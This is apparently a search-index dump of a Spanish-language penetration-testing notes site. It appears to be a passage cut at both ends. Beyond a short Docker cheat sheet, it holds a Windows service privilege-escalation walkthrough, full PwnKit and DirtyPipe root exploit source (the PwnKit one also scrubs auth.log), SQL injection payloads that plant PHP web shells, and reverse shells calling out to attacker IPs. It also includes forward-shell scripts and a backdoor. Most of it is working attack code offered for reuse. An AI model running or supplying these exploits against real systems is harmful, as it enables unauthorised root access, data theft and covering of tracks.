*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> ./winpeas.exe De forma mas sencilla se pueden enumerar los servicios directamente: # Se aprecia servicio con permisos de System: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc qc VGAuthService [SC] QueryServiceConfig SUCCESS SERVICE_NAME : VGAuthService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : VMware Alias Manager and Ticket Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem # Incluimos el user svc-printer a grupo de administrators: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc config VGAuthService binPath = \"cmd /c net localgroup Administrators svc-printer /add\" [SC] ChangeServiceConfig SUCCESS # Se para el servicio ya que esta corriendo actualmente: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc stop VGAuthService SERVICE_NAME : VGAuthService TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 0 ( 0x0 ) SERVICE_EXIT_CODE : 0 ( 0x0 ) CHECKPOINT : 0x0 WAIT_HINT : 0x0 # Y se vuelve a iniciar para que ejecute nuesto c\u00f3digo malicioso: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc start VGAuthService [SC] StartService FAILED 1053 : The service did not respond to the start or control request in a timely fashion . # Comprobamos que se ha ejecutado nuestro c\u00f3digo: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer / domain Members ------------------------------------------------------------------------------- Administrator Domain Admins Enterprise Admins svc-printer The command completed successfully . # Y por \u00faltimo tras salir y volver a entrar ya nos aplican los permisos del grupo de administradores locales: > * Evil-WinRM * PS C :\\ Users \\ administrator \\ desktop > cat root . txt 3aac5fdbc4b66b914df7797619328429","title":"Escalate privileges (Server Operator)"},{"location":"recursos/docker/","text":"Docker Cheatsheet Comandos b\u00e1sicos: # Borrar contenedores y borrar imagenes: docker rm $( docker ps -a -q ) --force docker rmi $( docker images -q ) # Montar y correr un contenedor con una versi\u00f3n especifica (-d) incluyendo rutas locales (-v): docker run --name mariadb -v /tmp/mysql:/var/lib/mysql -d mariadb:10.3.31 # Acceder al contenedor que est\u00e1 corriendo: docker exec -it mariadb bash","title":"Docker"},{"location":"recursos/docker/#docker","text":"","title":"Docker"},{"location":"recursos/docker/#cheatsheet","text":"Comandos b\u00e1sicos: # Borrar contenedores y borrar imagenes: docker rm $( docker ps -a -q ) --force docker rmi $( docker images -q ) # Montar y correr un contenedor con una versi\u00f3n especifica (-d) incluyendo rutas locales (-v): docker run --name mariadb -v /tmp/mysql:/var/lib/mysql -d mariadb:10.3.31 # Acceder al contenedor que est\u00e1 corriendo: docker exec -it mariadb bash","title":"Cheatsheet"},{"location":"recursos/exploits/","text":"Exploits PostExplotation - PWNKIT Existe un exploit para escalar a traves del binario /usr/bin/pkexec (parcheado 2022-01-11): #!/bin/bash echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \" echo \"\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\" echo \"\u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\" echo \"\u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d\" echo \"CVE-2021-4034 PoC by Kim Schulz\" # shell poc by Kim Schulz echo \"[+] Setting up environment...\" mkdir -p 'GCONV_PATH=.' touch 'GCONV_PATH=./pkwner' chmod a+x 'GCONV_PATH=./pkwner' mkdir -p pkwner echo \"module UTF-8// PKWNER// pkwner 2\" > pkwner/gconv-modules cat > pkwner/pkwner.c <<- EOM #include <stdio.h> #include <stdlib.h> #include <unistd.h> void gconv() {} void gconv_init() { printf(\"hello\"); setuid(0); setgid(0); seteuid(0); setegid(0); system(\"PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;\" \"rm -rf 'GCONV_PATH=.' 'pkwner';\" \"cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;\" \"/bin/bash\"); exit(0); } EOM cat > pkwner/exec.c <<- EOM #include <stdlib.h> #include <unistd.h> int main(){ char *env[] = {\"pkwner\", \"PATH=GCONV_PATH=.\", \"CHARSET=PKWNER\", \"SHELL=pkwner\", NULL}; execve(\"/usr/bin/pkexec\", (char *[]){NULL}, env); } EOM echo \"[+] Build offensive gconv shared module...\" gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c echo \"[+] Build mini executor...\" gcc -o pkwner/executor pkwner/exec.c # export PATH=\"GCONV_PATH=.\" # export CHARSET=\"PKWNER\" #export SHELL=pkwner PATH = 'GCONV_PATH=.' ./pkwner/executor echo \"[+] Nice Job\" PostExplotation - DIRTYPIPE Linux Privilege Escalation: DirtyPipe (CVE 2022-0847) (KERNEL 5.8 and later) (FIX 5.16.11 and 5.15.25): git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git cd CVE-2022-0847-DirtyPipe-Exploit ./compile.sh ./exploit C\u00f3digo a compilar: /* SPDX-License-Identifier: GPL-2.0 */ /* * Copyright 2022 CM4all GmbH / IONOS SE * * author: Max Kellermann <max.kellermann@ionos.com> * * Proof-of-concept exploit for the Dirty Pipe * vulnerability (CVE-2022-0847) caused by an uninitialized * \"pipe_buffer.flags\" variable. It demonstrates how to overwrite any * file contents in the page cache, even if the file is not permitted * to be written, immutable or on a read-only mount. * * This exploit requires Linux 5.8 or later; the code path was made * reachable by commit f6dd975583bd (\"pipe: merge * anon_pipe_buf*_ops\"). The commit did not introduce the bug, it was * there before, it just provided an easy way to exploit it. * * There are two major limitations of this exploit: the offset cannot * be on a page boundary (it needs to write one byte before the offset * to add a reference to this page to the pipe), and the write cannot * cross a page boundary. * * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\\nssh-ed25519 AAA......\\n' * * Further explanation: https://dirtypipe.cm4all.com/ */ #define _GNU_SOURCE #include <unistd.h> #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/stat.h> #include <sys/user.h> #ifndef PAGE_SIZE #define PAGE_SIZE 4096 #endif /** * Create a pipe where all \"bufs\" on the pipe_inode_info ring have the * PIPE_BUF_FLAG_CAN_MERGE flag set. */ static void prepare_pipe ( int p [ 2 ]) { if ( pipe ( p )) abort (); const unsigned pipe_size = fcntl ( p [ 1 ], F_GETPIPE_SZ ); static char buffer [ 4096 ]; /* fill the pipe completely; each pipe_buffer will now have the PIPE_BUF_FLAG_CAN_MERGE flag */ for ( unsigned r = pipe_size ; r > 0 ;) { unsigned n = r > sizeof ( buffer ) ? sizeof ( buffer ) : r ; write ( p [ 1 ], buffer , n ); r -= n ; } /* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */ for ( unsigned r = pipe_size ; r > 0 ;) { unsigned n = r > sizeof ( buffer ) ? sizeof ( buffer ) : r ; read ( p [ 0 ], buffer , n ); r -= n ; } /* the pipe is now empty, and if somebody adds a new pipe_buffer without initializing its \"flags\", the buffer will be mergeable */ } int main () { const char * const path = \"/etc/passwd\" ; printf ( \"Backing up /etc/passwd to /tmp/passwd.bak ... \\n \" ); FILE * f1 = fopen ( \"/etc/passwd\" , \"r\" ); FILE * f2 = fopen ( \"/tmp/passwd.bak\" , \"w\" ); if ( f1 == NULL ) { printf ( \"Failed to open /etc/passwd \\n \" ); exit ( EXIT_FAILURE ); } else if ( f2 == NULL ) { printf ( \"Failed to open /tmp/passwd.bak \\n \" ); fclose ( f1 ); exit ( EXIT_FAILURE ); } char c ; while (( c = fgetc ( f1 )) != EOF ) fputc ( c , f2 ); fclose ( f1 ); fclose ( f2 ); loff_t offset = 4 ; // after the \"root\" const char * const data = \":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh \\n \" ; // openssl passwd -1 -salt aaron aaron printf ( \"Setting root password to \\\" aaron \\\" ... \\n \" ); const size_t data_size = strlen ( data ); if ( offset % PAGE_SIZE == 0 ) { fprintf ( stderr , \"Sorry, cannot start writing at a page boundary \\n \" ); return EXIT_FAILURE ; } const loff_t next_page = ( offset | ( PAGE_SIZE - 1 )) + 1 ; const loff_t end_offset = offset + ( loff_t ) data_size ; if ( end_offset > next_page ) { fprintf ( stderr , \"Sorry, cannot write across a page boundary \\n \" ); return EXIT_FAILURE ; } /* open the input file and validate the specified offset */ const int fd = open ( path , O_RDONLY ); // yes, read-only! :-) if ( fd < 0 ) { perror ( \"open failed\" ); return EXIT_FAILURE ; } struct stat st ; if ( fstat ( fd , & st )) { perror ( \"stat failed\" ); return EXIT_FAILURE ; } if ( offset > st . st_size ) { fprintf ( stderr , \"Offset is not inside the file \\n \" ); return EXIT_FAILURE ; } if ( end_offset > st . st_size ) { fprintf ( stderr , \"Sorry, cannot enlarge the file \\n \" ); return EXIT_FAILURE ; } /* create the pipe with all flags initialized with PIPE_BUF_FLAG_CAN_MERGE */ int p [ 2 ]; prepare_pipe ( p ); /* splice one byte from before the specified offset into the pipe; this will add a reference to the page cache, but since copy_page_to_iter_pipe() does not initialize the \"flags\", PIPE_BUF_FLAG_CAN_MERGE is still set */ -- offset ; ssize_t nbytes = splice ( fd , & offset , p [ 1 ], NULL , 1 , 0 ); if ( nbytes < 0 ) { perror ( \"splice failed\" ); return EXIT_FAILURE ; } if ( nbytes == 0 ) { fprintf ( stderr , \"short splice \\n \" ); return EXIT_FAILURE ; } /* the following write will not create a new pipe_buffer, but will instead write into the page cache, because of the PIPE_BUF_FLAG_CAN_MERGE flag */ nbytes = write ( p [ 1 ], data , data_size ); if ( nbytes < 0 ) { perror ( \"write failed\" ); return EXIT_FAILURE ; } if (( size_t ) nbytes < data_size ) { fprintf ( stderr , \"short write \\n \" ); return EXIT_FAILURE ; } char * argv [] = { \"/bin/sh\" , \"-c\" , \"(echo aaron; cat) | su - -c \\\" \" \"echo \\\\\\\" Restoring /etc/passwd from /tmp/passwd.bak... \\\\\\\" ;\" \"cp /tmp/passwd.bak /etc/passwd;\" \"echo \\\\\\\" Done! Popping shell... (run commands now) \\\\\\\" ;\" \"/bin/sh;\" \" \\\" root\" }; execv ( \"/bin/sh\" , argv ); printf ( \"system() function call seems to have failed :( \\n \" ); return EXIT_SUCCESS ; }","title":"Exploits"},{"location":"recursos/exploits/#exploits","text":"","title":"Exploits"},{"location":"recursos/exploits/#postexplotation-pwnkit","text":"Existe un exploit para escalar a traves del binario /usr/bin/pkexec (parcheado 2022-01-11): #!/bin/bash echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \" echo \"\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\" echo \"\u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\" echo \"\u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d\" echo \"CVE-2021-4034 PoC by Kim Schulz\" # shell poc by Kim Schulz echo \"[+] Setting up environment...\" mkdir -p 'GCONV_PATH=.' touch 'GCONV_PATH=./pkwner' chmod a+x 'GCONV_PATH=./pkwner' mkdir -p pkwner echo \"module UTF-8// PKWNER// pkwner 2\" > pkwner/gconv-modules cat > pkwner/pkwner.c <<- EOM #include <stdio.h> #include <stdlib.h> #include <unistd.h> void gconv() {} void gconv_init() { printf(\"hello\"); setuid(0); setgid(0); seteuid(0); setegid(0); system(\"PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;\" \"rm -rf 'GCONV_PATH=.' 'pkwner';\" \"cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;\" \"/bin/bash\"); exit(0); } EOM cat > pkwner/exec.c <<- EOM #include <stdlib.h> #include <unistd.h> int main(){ char *env[] = {\"pkwner\", \"PATH=GCONV_PATH=.\", \"CHARSET=PKWNER\", \"SHELL=pkwner\", NULL}; execve(\"/usr/bin/pkexec\", (char *[]){NULL}, env); } EOM echo \"[+] Build offensive gconv shared module...\" gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c echo \"[+] Build mini executor...\" gcc -o pkwner/executor pkwner/exec.c # export PATH=\"GCONV_PATH=.\" # export CHARSET=\"PKWNER\" #export SHELL=pkwner PATH = 'GCONV_PATH=.' ./pkwner/executor echo \"[+] Nice Job\"","title":"PostExplotation - PWNKIT"},{"location":"recursos/exploits/#postexplotation-dirtypipe","text":"Linux Privilege Escalation: DirtyPipe (CVE 2022-0847) (KERNEL 5.8 and later) (FIX 5.16.11 and 5.15.25): git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git cd CVE-2022-0847-DirtyPipe-Exploit ./compile.sh ./exploit C\u00f3digo a compilar: /* SPDX-License-Identifier: GPL-2.0 */ /* * Copyright 2022 CM4all GmbH / IONOS SE * * author: Max Kellermann <max.kellermann@ionos.com> * * Proof-of-concept exploit for the Dirty Pipe * vulnerability (CVE-2022-0847) caused by an uninitialized * \"pipe_buffer.flags\" variable. It demonstrates how to overwrite any * file contents in the page cache, even if the file is not permitted * to be written, immutable or on a read-only mount. * * This exploit requires Linux 5.8 or later; the code path was made * reachable by commit f6dd975583bd (\"pipe: merge * anon_pipe_buf*_ops\"). The commit did not introduce the bug, it was * there before, it just provided an easy way to exploit it. * * There are two major limitations of this exploit: the offset cannot * be on a page boundary (it needs to write one byte before the offset * to add a reference to this page to the pipe), and the write cannot * cross a page boundary. * * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\\nssh-ed25519 AAA......\\n' * * Further explanation: https://dirtypipe.cm4all.com/ */ #define _GNU_SOURCE #include <unistd.h> #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/stat.h> #include <sys/user.h> #ifndef PAGE_SIZE #define PAGE_SIZE 4096 #endif /** * Create a pipe where all \"bufs\" on the pipe_inode_info ring have the * PIPE_BUF_FLAG_CAN_MERGE flag set. */ static void prepare_pipe ( int p [ 2 ]) { if ( pipe ( p )) abort (); const unsigned pipe_size = fcntl ( p [ 1 ], F_GETPIPE_SZ ); static char buffer [ 4096 ]; /* fill the pipe completely; each pipe_buffer will now have the PIPE_BUF_FLAG_CAN_MERGE flag */ for ( unsigned r = pipe_size ; r > 0 ;) { unsigned n = r > sizeof ( buffer ) ? sizeof ( buffer ) : r ; write ( p [ 1 ], buffer , n ); r -= n ; } /* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */ for ( unsigned r = pipe_size ; r > 0 ;) { unsigned n = r > sizeof ( buffer ) ? sizeof ( buffer ) : r ; read ( p [ 0 ], buffer , n ); r -= n ; } /* the pipe is now empty, and if somebody adds a new pipe_buffer without initializing its \"flags\", the buffer will be mergeable */ } int main () { const char * const path = \"/etc/passwd\" ; printf ( \"Backing up /etc/passwd to /tmp/passwd.bak ... \\n \" ); FILE * f1 = fopen ( \"/etc/passwd\" , \"r\" ); FILE * f2 = fopen ( \"/tmp/passwd.bak\" , \"w\" ); if ( f1 == NULL ) { printf ( \"Failed to open /etc/passwd \\n \" ); exit ( EXIT_FAILURE ); } else if ( f2 == NULL ) { printf ( \"Failed to open /tmp/passwd.bak \\n \" ); fclose ( f1 ); exit ( EXIT_FAILURE ); } char c ; while (( c = fgetc ( f1 )) != EOF ) fputc ( c , f2 ); fclose ( f1 ); fclose ( f2 ); loff_t offset = 4 ; // after the \"root\" const char * const data = \":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh \\n \" ; // openssl passwd -1 -salt aaron aaron printf ( \"Setting root password to \\\" aaron \\\" ... \\n \" ); const size_t data_size = strlen ( data ); if ( offset % PAGE_SIZE == 0 ) { fprintf ( stderr , \"Sorry, cannot start writing at a page boundary \\n \" ); return EXIT_FAILURE ; } const loff_t next_page = ( offset | ( PAGE_SIZE - 1 )) + 1 ; const loff_t end_offset = offset + ( loff_t ) data_size ; if ( end_offset > next_page ) { fprintf ( stderr , \"Sorry, cannot write across a page boundary \\n \" ); return EXIT_FAILURE ; } /* open the input file and validate the specified offset */ const int fd = open ( path , O_RDONLY ); // yes, read-only! :-) if ( fd < 0 ) { perror ( \"open failed\" ); return EXIT_FAILURE ; } struct stat st ; if ( fstat ( fd , & st )) { perror ( \"stat failed\" ); return EXIT_FAILURE ; } if ( offset > st . st_size ) { fprintf ( stderr , \"Offset is not inside the file \\n \" ); return EXIT_FAILURE ; } if ( end_offset > st . st_size ) { fprintf ( stderr , \"Sorry, cannot enlarge the file \\n \" ); return EXIT_FAILURE ; } /* create the pipe with all flags initialized with PIPE_BUF_FLAG_CAN_MERGE */ int p [ 2 ]; prepare_pipe ( p ); /* splice one byte from before the specified offset into the pipe; this will add a reference to the page cache, but since copy_page_to_iter_pipe() does not initialize the \"flags\", PIPE_BUF_FLAG_CAN_MERGE is still set */ -- offset ; ssize_t nbytes = splice ( fd , & offset , p [ 1 ], NULL , 1 , 0 ); if ( nbytes < 0 ) { perror ( \"splice failed\" ); return EXIT_FAILURE ; } if ( nbytes == 0 ) { fprintf ( stderr , \"short splice \\n \" ); return EXIT_FAILURE ; } /* the following write will not create a new pipe_buffer, but will instead write into the page cache, because of the PIPE_BUF_FLAG_CAN_MERGE flag */ nbytes = write ( p [ 1 ], data , data_size ); if ( nbytes < 0 ) { perror ( \"write failed\" ); return EXIT_FAILURE ; } if (( size_t ) nbytes < data_size ) { fprintf ( stderr , \"short write \\n \" ); return EXIT_FAILURE ; } char * argv [] = { \"/bin/sh\" , \"-c\" , \"(echo aaron; cat) | su - -c \\\" \" \"echo \\\\\\\" Restoring /etc/passwd from /tmp/passwd.bak... \\\\\\\" ;\" \"cp /tmp/passwd.bak /etc/passwd;\" \"echo \\\\\\\" Done! Popping shell... (run commands now) \\\\\\\" ;\" \"/bin/sh;\" \" \\\" root\" }; execv ( \"/bin/sh\" , argv ); printf ( \"system() function call seems to have failed :( \\n \" ); return EXIT_SUCCESS ; }","title":"PostExplotation - DIRTYPIPE"},{"location":"recursos/inyecciones/","text":"Inyecciones SQLi username=special&country='order by 1-- - (no error) username=special&country='union select sleep(10)-- - username=special&country='union select database()-- - username=special&country='union select version()-- - username=special&country='union select schema_name from information_schema.schemata-- - (muestra bases de datos) username=special&country='union select table_name from information_schema.tables where table_schema=\"registration\"-- - (muestra tablas en base de datos registration) username=special&country='union select column_name from information_schema.columns where table_schema=\"registration\" and table_name=\"registration\"-- - (muestra las columnas de la tabla registration) username=special&country='union select group_concat(username,\":\",userhash) from registration.registration-- - (muestra el contenido de las columnas) username=special&country='union select \"inyeccion\" into outfile \"/var/www/html/prueba.txt\"-- - (deposita contenido en un archivo del servidor) username=special&country=Brazil'union select \"<?php system($_REQUEST[\"cmd\"]);?>\" into outfile \"/var/www/html/shell.php\"-- -","title":"Inyecciones"},{"location":"recursos/inyecciones/#inyecciones","text":"","title":"Inyecciones"},{"location":"recursos/inyecciones/#sqli","text":"username=special&country='order by 1-- - (no error) username=special&country='union select sleep(10)-- - username=special&country='union select database()-- - username=special&country='union select version()-- - username=special&country='union select schema_name from information_schema.schemata-- - (muestra bases de datos) username=special&country='union select table_name from information_schema.tables where table_schema=\"registration\"-- - (muestra tablas en base de datos registration) username=special&country='union select column_name from information_schema.columns where table_schema=\"registration\" and table_name=\"registration\"-- - (muestra las columnas de la tabla registration) username=special&country='union select group_concat(username,\":\",userhash) from registration.registration-- - (muestra el contenido de las columnas) username=special&country='union select \"inyeccion\" into outfile \"/var/www/html/prueba.txt\"-- - (deposita contenido en un archivo del servidor) username=special&country=Brazil'union select \"<?php system($_REQUEST[\"cmd\"]);?>\" into outfile \"/var/www/html/shell.php\"-- -","title":"SQLi"},{"location":"recursos/shells/","text":"Recursos Ejecutar comandos con diferentes usuarios a trav\u00e9s de Powershell: $secPass = ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'ARKHAM\\batman' , $secPass ) Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { whoami } Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { cmd / c c :\\ temp \\ nc . exe -e powershell 10 . 10 . 14 . 11 8443 } CME RShell: crackmapexec smb -d . -u Administrator -p 'pass123' -X \"$c = New-Object System.Net.Sockets.TCPClient('192.168.204.190',444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\" 192 . 168 . 204 . 183 TTY OVER HTTP #!/usr/bin/python3 import requests , time , threading , pdb , signal , sys from base64 import b64encode from random import randrange class AllTheReads ( object ): def __init__ ( self , interval = 1 ): self . interval = interval thread = threading . Thread ( target = self . run , args = ()) thread . daemon = True thread . start () def run ( self ): readoutput = \"\"\"/bin/cat %s \"\"\" % ( stdout ) clearoutput = \"\"\"echo '' > %s \"\"\" % ( stdout ) while True : output = RunCmd ( readoutput ) if output : RunCmd ( clearoutput ) print ( output ) time . sleep ( self . interval ) def RunCmd ( cmd ): cmd = cmd . encode ( 'utf-8' ) cmd = b64encode ( cmd ) . decode ( 'utf-8' ) payload = { 'cmd' : 'echo \" %s \" | base64 -d | sh' % ( cmd ) } result = ( requests . get ( 'http://pressed.htb/xshell.php' , params = payload , timeout = 5 ) . text ) . strip () return result def WriteCmd ( cmd ): cmd = cmd . encode ( 'utf-8' ) cmd = b64encode ( cmd ) . decode ( 'utf-8' ) payload = { 'cmd' : 'echo \" %s \" | base64 -d > %s ' % ( cmd , stdin ) } result = ( requests . get ( 'http://pressed.htb/xshell.php' , params = payload , timeout = 5 ) . text ) . strip () return result def ReadCmd (): GetOutput = \"\"\"/bin/cat %s \"\"\" % ( stdout ) output = RunCmd ( GetOutput ) return output def SetupShell (): NamedPipes = \"\"\"mkfifo %s ; tail -f %s | /bin/sh 2>&1 > %s \"\"\" % ( stdin , stdin , stdout ) try : RunCmd ( NamedPipes ) except : None return None global stdin , stdout session = randrange ( 1000 , 9999 ) stdin = \"/dev/shm/input. %s \" % ( session ) stdout = \"/dev/shm/output. %s \" % ( session ) erasestdin = \"\"\"/bin/rm %s \"\"\" % ( stdin ) erasestdout = \"\"\"/bin/rm %s \"\"\" % ( stdout ) SetupShell () ReadingTheThings = AllTheReads () def sig_handler ( sig , frame ): print ( \" \\n\\n [*] Exiting... \\n \" ) print ( \"[*] Removing files... \\n \" ) RunCmd ( erasestdin ) RunCmd ( erasestdout ) print ( \"[*] All files have been deleted \\n \" ) sys . exit ( 0 ) signal . signal ( signal . SIGINT , sig_handler ) while True : cmd = input ( \"> \" ) WriteCmd ( cmd + \" \\n \" ) time . sleep ( 1.1 ) PHP Shells: # Desde SQLi: username=special&country='union select \" <?php echo shell_exec ( $_REQUEST [ 'cmd' ]); ?> \" into outfile \"/var/www/html/shell.php\"-- - # Desde consola: echo \" <?php popen ( 'bash -c \\\"bash -i >& /dev/tcp/10.10.14.11/8443 0>&1\\\"' , \"r\" ); ?> \" > hola.php # BackdoorShell con filtro ip: <?php if ( $_SERVER [ 'REMOTE_ADDR' ] !== '10.10.14.10' ) { echo ( \"Get Lost...\" ); die (); } system ( $_REQUEST [ 'cmd' ]); ?> ## WebShell con etiquetas preformateadas: <?php echo \"<pre>\" . shell_exec ( $_REQUEST [ 'cmd' ]) . \"</pre>\" ; ?> ## Control desde bash: #/bin/bash function ctrl_c(){ echo -e \"\\n\\n[!] Saliendo ...\" exit 1 } trap ctrl_c INT main_url=\"http://pressed.htb/index.php/2022/01/28/hello-world-3/?cmd=\" while [ \"$command\" != \"exit\" ]; do echo -n \"$~ \" && read command command=$(echo \"$command 2>%261\" | tr -s ' ' '+') curl -s -X GET \"$main_url$command\" | grep \"<pre>\" -A 100 | grep \"</pre>\" -B 100 | sed 's/<pre>//' | sed 's/<\\/pre>//' done ## Control desde python: #!/usr/bin/python3 import signal, requests, pdb, time, sys, threading, re from http.client import HTTPConnection HTTPConnection.debuglevel = 0 def def_handler(sig, frame): print(\"\\n[!] Saliendo... \") sys.exit(1) # Ctrl + c signal.signal(signal.SIGINT, def_handler) # Variables globales main_url = \"http://localhost:81/xshell.php\" def RunCmd(command): post = { \"cmd\" : command } r = requests.post(main_url, data=post) #pdb.set_trace() filter = re.findall(r'<pre>(.*?)\\n</pre>',r.text, flags=re.DOTALL)[0] return filter + \"\\n\" if __name__ == '__main__': while True: command = input(\"$~ \") print(RunCmd (command)) # C\u00f3digo que aloja un archivo php metiendo una shell en base64: <?php file_put_contents ( 'xshell.php' , base64_decode ( 'PD9waHAKCWVjaG8gc2hlbGxfZXhlYygkX1JFUVVFU1RbJ2NtZCddKTsKPz4K' )); echo ( \"Success\" ); ?> WebShell php: Shell con una interfaz muy amigable: http://victima.com/uploads/webshell.php <?php function featureShell ( $cmd , $cwd ) { $stdout = array (); if ( preg_match ( \"/^\\s*cd\\s*$/\" , $cmd )) { // pass } elseif ( preg_match ( \"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\" , $cmd )) { chdir ( $cwd ); preg_match ( \"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\" , $cmd , $match ); chdir ( $match [ 1 ]); } elseif ( preg_match ( \"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\" , $cmd )) { chdir ( $cwd ); preg_match ( \"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\" , $cmd , $match ); return featureDownload ( $match [ 1 ]); } else { chdir ( $cwd ); exec ( $cmd , $stdout ); } return array ( \"stdout\" => $stdout , \"cwd\" => getcwd () ); } function featurePwd () { return array 